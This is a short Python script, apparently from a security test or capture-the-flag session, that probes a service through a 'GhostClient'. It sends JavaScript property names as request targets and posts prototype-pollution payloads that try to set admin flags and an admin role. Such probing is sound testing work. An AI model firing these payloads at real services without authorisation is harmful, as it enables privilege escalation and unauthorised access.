from client import GhostClient

c = GhostClient()
c.bootstrap()

targets = [
    "__proto__",
    "constructor",
    "prototype",
    "toString",
    "valueOf",
]

for t in targets:
    try:
        res = c.request(t, {"q": "test"})
        print(f"Target {t:20s} -> {res}")
    except Exception as e:
        print(f"Target {t:20s} -> EXC: {e}")

# Test prototype pollution in body
body_tests = [
    {"q": "test", "__proto__": {"admin": True, "role": "admin"}},
    {"q": "test", "constructor": {"prototype": {"admin": True}}},
]

for b in body_tests:
    try:
        res = c.request("search", b)
        print(f"Body {b} -> {res}")
    except Exception as e:
        print(f"Body {b} -> EXC: {e}")
